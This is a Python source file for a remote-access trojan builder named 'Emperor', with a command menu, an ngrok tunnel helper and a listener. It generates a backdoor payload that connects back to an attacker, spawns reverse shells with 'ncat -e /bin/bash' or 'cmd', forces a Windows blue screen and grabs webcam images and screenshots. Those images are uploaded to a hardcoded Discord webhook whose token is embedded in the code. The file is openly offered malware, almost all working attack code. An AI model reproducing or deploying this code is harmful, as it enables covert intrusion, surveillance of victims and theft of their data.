#!/usr/bin/env python

import os
import time
import socket
import requests
import subprocess

EMPEROR_LOGO_BANNER = ("""
\033[97;1m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠶⠶⠿⢿⣿⣿⣿⣿⣷⣶⣶⣶⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣴⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠋⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣴⣾⣿⣿⣿⣷⣶⣤⡈⠙⢿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠙⢿⣿⣿⣿⣿⣆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢻⣿⣿⣿⣿⣧⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢿⣿⣿⣿⣿⣇⠀⠀
⠀⠀⠀⠀⠀⠀⣤⣤⣤⣤⣤⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡆⢸⣿⣿⣿⣿⣿⡄⠀
⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⢹⣿⣿⣿⣿⣿⣆⣠⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⣷⠀
⠀⠀⢰⣶⡆⠀⠀⠀⠀⢀⣀⣀⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢰⣿⣿⣿⣿⣿⣿⡆
⢀⠀⢸⣿⣧⣰⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⣾⣿⣿⣿⣿⣿⣿⣇
⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿
⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣈⠉⠛⠛⠛⠛⢉⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋
⣶⣌⡛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⣋⣥⣾⡿
⠙⢿⣿⣷⣶⣬⣙⡛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⢛⣉⣥⣴⣾⣿⣿⣿⣿⡇
⠀⠀⠙⣿⡟⢿⣿⣿⣿⣷⣶⣦⣬⣭⣉⣙⣛⣛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⢛⣛⣛⣋⣩⣭⣭⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠀⠀⠀⣿⡇⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀
⠀⠀⠀⠀⠀⢠⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣠⣤⣤⣤⣤⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⢉⣭⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⠿⠿⠟⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[0m
\033[97;1m AUTHOR:\033[0m \033[91m@Император Сидий\033[0m
\033[97;1m VERSION:\033[0m \033[91m1.0.0\033[0m \033[97;1m[BETA]\033[0m
\033[97;1m GITHUB:\033[0m \033[91mhttps://github.com/Sidius999\033[0m
\033[97;1m DISCORD:\033[0m \033[91msidius.sith_\033[0m
""")

EMPEROR_MENU_BANNER = ("""
 \033[97;1m╔═══[COMMAND]══════[DESCRIPTION]══════════════════════════════════════════════════════╗\033[0m
 \033[97;1m║>>>\033[0m \033[91mhelp\033[0m           \033[97;1mDisplay all [Emperor] software commands                           ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mbackdoor\033[0m       \033[97;1mGenerate a backdoor '.py' file                                    ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mngrok\033[0m          \033[97;1mDeploy a remote server to carry out our attacks                   ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mlistener\033[0m       \033[97;1mStart the [listener] tool                                         ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mbanner\033[0m         \033[97;1mDisplay software banner                                           ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mreset\033[0m          \033[97;1mReset the [Emperor] software                                      ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mleave\033[0m          \033[97;1mQuit [Emperor] software                                           ║\033[0m
 \033[97;1m╚═════════════════════════════════════════════════════════════════════════════════════╝\033[0m
""")

LISTENER_MENU_BANNER = ("""
 \033[97;1m╔═══[COMMAND]══════[DESCRIPTION]══════════════════════════════════════════════════════╗\033[0m
 \033[97;1m║>>>\033[0m \033[91mzombie -l\033[0m      \033[97;1mStart zombie mode on the target machine Linux                     ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mzombie -w\033[0m      \033[97;1mStart zombie mode on the target machine Windows                   ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mbsod\033[0m           \033[97;1mStart BSOD mode on the target machine                             ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mipinfo\033[0m         \033[97;1mObtain all the IP address information of the target machine       ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mwebcam\033[0m         \033[97;1mObtain the real-time webcam of the target machine.                ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mscreenshot\033[0m     \033[97;1mObtain the screenshot of the target machine webcam                ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mreset\033[0m          \033[97;1mReset the [listener] tool                                         ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mleave\033[0m          \033[97;1mQuit [listener] tool                                              ║\033[0m
 \033[97;1m╚═════════════════════════════════════════════════════════════════════════════════════╝\033[0m
""")

os.system("clear")

def TEXT_DELAY(TEXT, DELAY):
    for CHAR in TEXT:
        print(CHAR, end='', flush=True)
        time.sleep(DELAY)
    print()
    
def BACKDOOR():
    LHOST = input(" \033[97;1m╔═[\033[0m\033[91mИмператор Сидий\033[0m\033[97;1m]═[\033[91mLHOST\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")
    LPORT = input(" \033[97;1m╔═[\033[0m\033[91mИмператор Сидий\033[0m\033[97;1m]═[\033[91mLPORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")
    print(" \033[97;1m[\033[38;5;208m...\033[0m] Backdoor generation in '.py' file in progress...\033[0m")
    time.sleep(2)

    with open("backdoor/backdoor.py", "w") as FILE:
         FILE.write(f'''
import os
import time
import socket
import requests
import discord
import pyautogui
import cv2
import ctypes
import subprocess
from flask import Flask, render_template, Response, url_for


def MALWARE():
    LHOST = "{LHOST}"
    LPORT = {LPORT}

    SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    SOCKET.connect((LHOST, LPORT))

    while True:
        MALWARE_RECV = SOCKET.recv(8000).decode()
        
        if MALWARE_RECV == "zombie -l":
           os.system("ncat {LHOST} {LPORT} -e /bin/bash")
           
        if MALWARE_RECV == "zombie -w":
           os.system("ncat {LHOST} {LPORT} -e cmd")
           
        if MALWARE_RECV == "bsod":
           ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
           ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))           
        
        if MALWARE_RECV == "ipinfo":
           IPINFO = requests.get("https://ipinfo.io/json")
           SOCKET.send(IPINFO.text.encode())
           
        if MALWARE_RECV == "webcam":
           WEBCAM = cv2.VideoCapture(0)

           while True:
               RET, FRAME = WEBCAM.read()
    
               cv2.imshow('Webcam', FRAME)
               if cv2.waitKey(1) & 0xFF == ord('s'):
                  break

           WEBCAM.release()
           cv2.destroyAllWindows()
           
        if MALWARE_RECV == "screenshot":
           IMAGE_DESKTOP = pyautogui.screenshot()
           IMAGE_DESKTOP.save("WEBCAM.jpg")

           WEBCAM = cv2.VideoCapture(0)

           RET, FRAME = WEBCAM.read()

           WEBCAM.release()

           cv2.imwrite("WEBCAM.jpg", FRAME)

           with open("WEBCAM.jpg", "rb") as IMAGE:
                IMAGE.read()
                
           WEBHOOK = "https://discord.com/api/webhooks/1165737675635036200/jnvMkGQnYcEHQ1fjuAFKxfwCkNM729umhnG4n_0t8he2bOkiKGbsayb6mo0EpYKzTymK"
           FILES = {{"file1": open("WEBCAM.jpg", "rb")}}
           DATA = {{
               "username": "Император Сидий",
               "avatar_url":"https://i.pinimg.com/736x/95/4f/de/954fde8e632be62678574ee83643131e.jpg"
           }}
           RESPONSE = requests.post(WEBHOOK, data=DATA, files=FILES)        

        if MALWARE_RECV == "leave":
           os._exit(0)

           OUTPUT = subprocess.Popen(MALWARE_RECV, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
           RESULT = OUTPUT.stdout.read() + OUTPUT.stderr.read()
           SOCKET.send(RESULT)

    SOCKET.close()

MALWARE()
''')

def NGROK():
    IP = input(" \033[97;1m╔═[\033[0m\033[91mИмператор Сидий\033[0m\033[97;1m]═[\033[91mIP\033[0m\033[97;1m]\n\033[97;1m ╚═════════|> \033[0m")
    PORT = input(" \033[97;1m╔═[\033[0m\033[91mИмператор Сидий\033[0m\033[97;1m]═[\033[91mPORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════|> \033[0m")
    NGROK_COMMAND = f"ngrok tcp {IP}:{PORT}"
    subprocess.run(NGROK_COMMAND, shell=True)
    
def LISTENER():
    
    os.system("clear")
    
    TEXT_DELAY(EMPEROR_LOGO_BANNER, 0.0005)
    TEXT_DELAY(LISTENER_MENU_BANNER, 0.0005)
 
    LHOST = input(" \033[97;1m╔═[\033[0m\033[91mИмператор Сидий\033[0m\033[97;1m]═[\033[91mLHORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")  
    LPORT = input(" \033[97;1m╔═[\033[0m\033[91mИмператор Сидий\033[0m\033[97;1m]═[\033[91mLPORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")

    SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    SOCKET.bind((LHOST, int(LPORT)))
    SOCKET.listen(10000)

    print(" \033[97;1m[\033[38;5;208m...\033[0m] Waiting for the target machine to connect...\033[0m")

    CONN, ADDR = SOCKET.accept()
    print(" \033[97;1m[\033[38;5;208m...\033[0m] Connection established from >>>\033[0m", ADDR)

    while True:
        print("")
        print(" \033[97;1m[Use the 'help' command in the software]\033[0m")
        print(" \033[97;1m╔═[\033[0m\033[91mИмператор Сидий\033[0m\033[97;1m]═[\033[91mlistener\033[0m\033[97;1m]")
        print(" \033[97;1m╚═════════>>>\033[0m", end=" ") 
        LISTENER_INPUT = input()
           
        if LISTENER_INPUT == "zombie -l":
           print(" \033[97;1m[\033[38;5;208m...\033[0m] Starting zombie mode on the target machine Linux...\033[0m")
           time.sleep(2)
           CONN.send("zombie -l".encode())
           os.system("ncat -lvnp 834")
           
        if LISTENER_INPUT == "zombie -w":
           print(" \033[97;1m[\033[38;5;208m...\033[0m] Starting zombie mode on the target machine Windows...\033[0m")
           time.sleep(2)
           CONN.send("zombie -w".encode())
           os.system("ncat -lvnp 835")
           
        if LISTENER_INPUT == "bsod":
           print(" \033[97;1m[\033[38;5;208m...\033[0m] Starting BSOD mode on the target machine...\033[0m")
           time.sleep(2)
           CONN.send("bsod".encode())
           
        if LISTENER_INPUT == "ipinfo":
           print(" \033[97;1m[\033[38;5;208m...\033[0m] Obtaining the IP address information of the target machine...\033[0m")
           time.sleep(2)
           CONN.send("ipinfo".encode())
           IPINFO = CONN.recv(8000).decode()
           print(IPINFO)
           
        if LISTENER_INPUT == "webcam":
           print(" \033[97;1m[\033[38;5;208m...\033[0m] Obtaining the real-time webcam of the target machine...\033[0m")
           time.sleep(2)
           CONN.send("webcam".encode())
           
        if LISTENER_INPUT == "screenshot":
           print(" \033[97;1m[\033[38;5;208m...\033[0m] Obtaining the screenshot of the target machine webcam...\033[0m")
           time.sleep(2)
           CONN.send("screenshot".encode())
           
        if LISTENER_INPUT == "reset":
           print(" \033[97;1m[\033[38;5;208m...\033[0m] Reset the [listener] tool...\033[0m")
           time.sleep(2)
           LISTENER()        

        if LISTENER_INPUT == "leave":
           CONN.send("leave".encode())
           EMPEROR()

    CONN.close()
    SOCKET.close()    

def EMPEROR():

    os.system("clear")
    
    TEXT_DELAY(EMPEROR_LOGO_BANNER, 0.0005)
    TEXT_DELAY(EMPEROR_MENU_BANNER, 0.0005)
    
    while True:
        print("")
        print(" \033[97;1m[Use the 'help' command in the software]\033[0m")
        print(" \033[97;1m╔═[\033[0m\033[91mИмператор Сидий\033[0m\033[97;1m]═[\033[91mEmperor\033[0m\033[97;1m]")
        print(" \033[97;1m╚═════════>>>\033[0m", end=" ") 
        EMPEROR_INPUT = input()
        
        if EMPEROR_INPUT == "help":
           print(" \033[97;1m[\033[38;5;208m...\033[0m] Watching all [Emperor] software commands...\033[0m")
           time.sleep(2)
           TEXT_DELAY(EMPEROR_MENU_BANNER, 0.0005)
           time.sleep(10)
           EMPEROR()
           
        if EMPEROR_INPUT == "backdoor":
           print(" \033[97;1m[\033[38;5;208m...\033[0m] Starting [backdoor] in progress...\033[0m")
           time.sleep(2)
           BACKDOOR()
           
        if EMPEROR_INPUT == "ngrok":
           print(" \033[97;1m[\033[38;5;208m...\033[0m] Starting [ngrok] in progress...\033[0m")
           time.sleep(2)
           NGROK()
           
        if EMPEROR_INPUT == "listener":
           print(" \033[97;1m[\033[38;5;208m...\033[0m] Starting [listener] in progress...\033[0m")
           time.sleep(2)
           LISTENER()
        
        if EMPEROR_INPUT == "banner":
           print(" \033[97;1m[\033[38;5;208m...\033[0m] Display the [Emperor] software banner...\033[0m")
           time.sleep(2)
           TEXT_DELAY(DRAC_LOGO_BANNER, 0.0005)
           time.sleep(5)
           EMPEROR()
           
        if EMPEROR_INPUT == "reset":
           print(" \033[97;1m[\033[38;5;208m...\033[0m] Reset the [Emperor] software...\033[0m")
           time.sleep(2)
           EMPEROR()
        
        if EMPEROR_INPUT == "leave":
           print(" \033[97;1m[\033[38;5;208m...\033[0m] Quit the [Emperor] software...\033[0m")
           time.sleep(2)
           os._exit(0)
    
EMPEROR()
